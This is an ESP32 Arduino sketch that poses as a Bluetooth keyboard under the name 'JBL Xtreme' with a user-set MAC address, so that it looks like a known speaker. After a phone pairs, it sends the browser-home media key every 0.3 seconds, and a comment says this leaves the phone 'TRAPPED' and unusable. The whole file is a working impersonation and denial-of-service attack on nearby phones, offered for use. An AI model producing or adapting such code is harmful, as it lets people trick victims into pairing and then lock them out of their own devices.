#include <BleKeyboard.h>

// BLE Keyboard
BleKeyboard bleKeyboard("JBL Xtreme", "Custom Manufacturer", 100);

// Set HERE YOUR MAC address
const uint8_t customMacAddr[] = {0xF4, 0xF3, 0xAA, 0x07, 0xE4, 0xF2};

void setup() {
  Serial.begin(115200);
  Serial.println("Starting BLE work!");

  // set ! CUSTOM MAC ADDRESS !
  esp_base_mac_addr_set(customMacAddr);
  Serial.print("Vlastná MAC adresa nastavená na: ");
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", customMacAddr[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.println();

  // Initialize BLE Keyboard
  bleKeyboard.begin();
}

void loop() {
  // Check if is device connected (sometimes send message but isnt actually connected)
  if (bleKeyboard.isConnected()) {
    Serial.println("BLE zariadenie pripojené!");

    // Send Medial button WWW_HOME
    Serial.println("Odosielam tlačidlo: WWW_HOME");
    bleKeyboard.write(KEY_MEDIA_WWW_HOME);

    // SEND KEYSTROKE EVERY 0.3 Seconds
    // Ensures now will be phone (or connected device TRAPPED and cannot use phone enymore) 
    delay(300);
  } else {
    Serial.println("Čakám na pripojenie BLE zariadenia...");
  }

  delay(100);
}
